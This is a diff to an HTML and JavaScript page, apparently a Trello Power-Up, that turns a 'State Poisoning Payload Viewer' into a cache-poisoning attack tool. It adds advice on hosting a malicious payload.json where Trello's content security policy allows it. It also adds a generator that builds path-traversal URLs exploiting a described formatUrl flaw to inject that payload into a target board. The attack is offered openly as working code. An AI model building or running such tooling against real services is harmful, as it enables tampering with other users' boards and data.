@@ -102,11 +102,55 @@
         .attachment-item:hover {
             background: #f4f5f7;
         }
+        .hosting-options {
+            margin-top: 20px;
+            padding: 15px;
+            background: #fff4e5;
+            border-left: 4px solid #ffab00;
+            border-radius: 4px;
+        }
+        .hosting-options h3 {
+            margin-top: 0;
+            color: #b7791f;
+        }
+        .hosting-options code {
+            background: #f4f5f7;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+        .url-generator {
+            margin-top: 20px;
+            padding: 15px;
+            background: #e3fcef;
+            border-left: 4px solid #00875a;
+            border-radius: 4px;
+        }
+        .url-generator h3 {
+            margin-top: 0;
+            color: #00875a;
+        }
+        .generated-url {
+            background: #f4f5f7;
+            padding: 10px;
+            border-radius: 4px;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+        .copy-btn {
+            background: #00875a;
+            margin-top: 5px;
+        }
+        .copy-btn:hover {
+            background: #006644;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>State Poisoning Payload Viewer</h1>
+        <h1>State Poisoning Payload Viewer & Cache Poisoning Tool</h1>
         
         <div class="info">
             <strong>Instructions:</strong> Upload payload.json as an attachment to a Trello card, then either:
@@ -114,6 +158,55 @@
                 <li>Enter the card ID below and click "Load from Card"</li>
                 <li>Or enter the direct attachment URL and click "Load from URL"</li>
             </ul>
+        </div>
+
+        <div class="hosting-options">
+            <h3>🌐 CSP-Friendly Hosting Options for Cache Poisoning</h3>
+            <p><strong>Recommended hosting locations (Trello CSP allows these):</strong></p>
+            <ul style="margin: 10px 0; padding-left: 20px;">
+                <li><strong>Trello Card Attachment</strong> (Most Reliable):
+                    <br><code>https://trello.com/1/cards/{cardId}/attachments/{attachmentId}/download/payload.json</code>
+                    <br>✅ Always works, no CORS issues
+                </li>
+                <li><strong>GitHub Raw Content</strong>:
+                    <br><code>https://raw.githubusercontent.com/{user}/{repo}/{branch}/payload.json</code>
+                    <br>✅ Usually allowed, serves with proper CORS headers
+                </li>
+                <li><strong>GitLab Raw Content</strong>:
+                    <br><code>https://gitlab.com/{user}/{repo}/-/raw/{branch}/payload.json</code>
+                    <br>✅ Similar to GitHub
+                </li>
+                <li><strong>Gist Raw</strong>:
+                    <br><code>https://gist.githubusercontent.com/{user}/{gistId}/raw/{fileHash}/payload.json</code>
+                    <br>✅ GitHub infrastructure, reliable
+                </li>
+                <li><strong>Pastebin Raw</strong>:
+                    <br><code>https://pastebin.com/raw/{pasteId}</code>
+                    <br>⚠️ May have CORS restrictions
+                </li>
+                <li><strong>Your Own Server</strong>:
+                    <br><code>https://yourdomain.com/payload.json</code>
+                    <br>✅ If you control it, add CORS headers: <code>Access-Control-Allow-Origin: *</code>
+                </li>
+            </ul>
+            <p><strong>Note:</strong> For the path traversal attack, the URL must be accessible via GET request and return valid JSON with <code>Content-Type: application/json</code></p>
+        </div>
+
+        <div class="url-generator">
+            <h3>🔗 Path Traversal URL Generator</h3>
+            <p>Generate the attack URL to exploit the formatUrl vulnerability:</p>
+            <label><strong>Base URL (e.g., /1/Board/:idBoard):</strong></label>
+            <input type="text" id="baseUrl" placeholder="/1/Board/:idBoard" value="/1/Board/:idBoard">
+            
+            <label style="display: block; margin-top: 10px;"><strong>Target Board ID:</strong></label>
+            <input type="text" id="targetBoardId" placeholder="69583c19f7b72cc979d35492">
+            
+            <label style="display: block; margin-top: 10px;"><strong>Payload Host URL:</strong></label>
+            <input type="text" id="payloadHostUrl" placeholder="https://trello.com/1/cards/.../attachments/.../download/payload.json">
+            
+            <button onclick="generateAttackUrl()" style="margin-top: 10px;">Generate Attack URL</button>
+            <div id="generatedUrl" class="generated-url" style="display: none;"></div>
+            <button id="copyBtn" class="copy-btn" onclick="copyAttackUrl()" style="display: none;">Copy URL</button>
         </div>
 
         <div class="controls">
@@ -288,6 +381,89 @@
                 .catch(error => {
                     showStatus('Error getting current card: ' + error.message, 'error');
                 });
+        }
+
+        // Auto-load from current card if available
+        if (t) {
+            t.card('id')
+                .then(cardId => {
+                    if (cardId) {
+                        document.getElementById('cardId').value = cardId;
+                        loadFromCurrentCard();
+                    }
+                })
+                .catch(() => {
+                    // Not in card context, ignore
+                });
+        }
+
+        function generateAttackUrl() {
+            const baseUrl = document.getElementById('baseUrl').value.trim();
+            const targetBoardId = document.getElementById('targetBoardId').value.trim();
+            const payloadHostUrl = document.getElementById('payloadHostUrl').value.trim();
+
+            if (!baseUrl || !targetBoardId || !payloadHostUrl) {
+                showStatus('Please fill in all fields', 'error');
+                return;
+            }
+
+            // Extract the rootId pattern (e.g., :idBoard)
+            const rootIdMatch = baseUrl.match(/:(\w+)/);
+            if (!rootIdMatch) {
+                showStatus('Base URL must contain a pattern like :idBoard', 'error');
+                return;
+            }
+
+            const rootId = ':' + rootIdMatch[1];
+            
+            // Construct path traversal payload
+            // The formatUrl function does: url.replace(rootId, idModel)
+            // So we can inject ../ to traverse up and then point to our payload
+            const pathTraversal = '../attachments/';
+            
+            // For a card attachment, we need to construct the path
+            // Example: /1/Board/69583c19f7b72cc979d35492/../attachments/{attachmentId}/download/payload.json
+            // But we need the actual card ID and attachment ID from the payload URL
+            
+            // Extract card ID and attachment ID from payload URL if it's a Trello URL
+            let attackUrl = '';
+            const trelloMatch = payloadHostUrl.match(/\/cards\/([^\/]+)\/attachments\/([^\/]+)/);
+            
+            if (trelloMatch) {
+                const cardId = trelloMatch[1];
+                const attachmentId = trelloMatch[2];
+                
+                // Construct the path traversal attack URL
+                // Format: /1/Board/{targetBoardId}/../cards/{cardId}/attachments/{attachmentId}/download/payload.json
+                attackUrl = `/1/Board/${targetBoardId}/../cards/${cardId}/attachments/${attachmentId}/download/payload.json`;
+            } else {
+                // For external URLs, we can't use path traversal directly
+                // But we can show how the formatUrl would be exploited
+                // The attack would be: manipulate the idModel parameter to include path traversal
+                showStatus('For external URLs, you need to exploit formatUrl by manipulating the idModel parameter. The URL would be constructed server-side.', 'info');
+                attackUrl = `Path traversal in formatUrl: Replace "${rootId}" with "${targetBoardId}/../path/to/payload"`;
+            }
+
+            const urlDiv = document.getElementById('generatedUrl');
+            const copyBtn = document.getElementById('copyBtn');
+            
+            urlDiv.textContent = attackUrl;
+            urlDiv.style.display = 'block';
+            copyBtn.style.display = 'inline-block';
+            urlDiv.dataset.url = attackUrl;
+            
+            showStatus('Attack URL generated!', 'success');
+        }
+
+        function copyAttackUrl() {
+            const urlDiv = document.getElementById('generatedUrl');
+            const url = urlDiv.dataset.url || urlDiv.textContent;
+            
+            navigator.clipboard.writeText(url).then(() => {
+                showStatus('URL copied to clipboard!', 'success');
+            }).catch(err => {
+                showStatus('Failed to copy: ' + err.message, 'error');
+            });
         }
 
         // Auto-load from current card if available
